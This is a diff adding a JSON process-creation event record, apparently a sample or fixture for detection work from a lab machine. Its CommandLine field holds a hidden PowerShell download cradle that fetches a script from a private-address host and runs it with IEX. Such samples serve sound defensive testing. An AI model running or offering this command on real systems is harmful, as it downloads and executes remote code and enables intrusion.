@@ -1,0 +1,12 @@
+{
+ "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+ "CommandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')",
+ "OriginalFileName": "POWERSHELL.EXE",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+ "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+ "User": "LABPC\\student",
+ "IntegrityLevel": "Medium",
+ "Description": "",
+ "Product": "",
+ "Company": ""
+}
